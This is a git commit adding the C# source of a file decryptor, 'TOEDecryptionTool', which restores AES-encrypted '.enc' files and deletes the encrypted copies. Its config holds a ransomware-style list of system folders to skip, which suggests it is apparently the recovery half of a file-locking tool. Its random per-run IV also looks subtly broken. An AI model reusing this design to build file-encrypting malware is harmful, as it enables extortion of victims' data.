7fbdf5759fd6470e20c11358b636cb4d7ac7a665
naomi <116236871+CementMix3r@users.noreply.github.com>
2024-04-20 20:31:45 +0100

    Add files via upload

---
+++ SimpleEncryptionTool/TOEDecryptionTool/Config.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace TOEDecryptionTool
+{
+    internal class Config
+    {
+        internal static readonly string IV = Byte2ToStr(IVGen());
+        internal static readonly string ext = ".enc";
+        private static string _key;
+
+        internal static string Key
+        {
+            get { return _key; }
+        }
+
+        internal static void SetKey(string key)
+        {
+            if (key.Length == 32)
+            {
+                _key = key;
+            }
+            else
+            {
+                Console.WriteLine("Key must be 32 chars !");
+            }
+        }
+
+        internal static readonly string[] WhiteFldrs =
+        {
+            "\\AppData", "\\ApplicationData", "\\Windows", "\\Program Files\\",
+            "\\Program Files (x86)\\", "\\recycle.bin", "\\config.msi",
+            "\\$windows.~bt", "\\$windows.~ws\\", "\\Windows", "\\boot",
+            "\\program files\\", "\\program files (x86)\\", "\\ProgramData",
+            "\\System Volume Information\\", "Tor Browser\\", "\\windows.old",
+            "\\intel", "\\msocache", "\\perflogs", "\\x64dbg", "\\Public",
+            "\\All Users\\", "\\Default", "\\Microsoft", "\\$Recycle.Bin",
+            "\\.", "\\$WinREAgent", "\\hp", "\\SWSetup", "\\System.sav", "\\go",
+            "\\Boot", "\\winnt", "\\Roaming"
+        };
+
+        internal static byte[] IVGen()
+        {
+            using (RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider())
+            {
+                byte[] iv = new byte[8];
+                rngCsp.GetBytes(iv);
+                return iv;
+            }
+        }
+
+
+        internal static string Byte2ToStr(byte[] bytes)
+        {
+            StringBuilder hex = new StringBuilder(bytes.Length * 2);
+
+            foreach (byte b in bytes)
+            {
+                hex.AppendFormat("{0:x2}", b);
+            }
+
+            return hex.ToString();
+        }
+    }
+}
---
+++ SimpleEncryptionTool/TOEDecryptionTool/CryptIO.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace TOEDecryptionTool
+{
+    internal class CryptIO
+    {
+        // Decrypt File
+        internal static bool Decrypt(string file)
+        {
+            try
+            {
+                using (RijndaelManaged aes = new RijndaelManaged())
+                {
+                    aes.KeySize = 256;
+                    aes.BlockSize = 128;
+                    aes.Mode = CipherMode.CBC;
+                    aes.Key = Encoding.UTF8.GetBytes(Config.Key);
+                    aes.IV = Encoding.UTF8.GetBytes(Config.IV);
+                    aes.Padding = PaddingMode.PKCS7;
+
+                    ICryptoTransform d = aes.CreateDecryptor();
+
+                    string denFile = file.Replace(Config.ext, String.Empty);
+
+                    using (FileStream fsDe = new FileStream(file, FileMode.Open))
+                    {
+                        using (FileStream fsDecrypt = new FileStream(denFile, FileMode.Create))
+                        {
+                            using (CryptoStream cs = new CryptoStream(fsDe, d, CryptoStreamMode.Read))
+                            {
+                                int data;
+
+                                while ((data = cs.ReadByte()) != -1)
+                                {
+                                    fsDecrypt.WriteByte((byte)data);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Could not decrypt file: " + e.ToString());
+                return false;
+            }
+
+            return true;
+        }
+
+        // Handle Decrypt File
+        internal static void DecryptFile(string file)
+        {
+            // If Dec function returns true then delete the original file
+            if (Decrypt(file))
+            {
+                File.Delete(file);
+            }
+            else
+            {
+                Console.WriteLine($"[!] Failed to Decrypt File: {file}");
+            }
+        }
+    }
+}
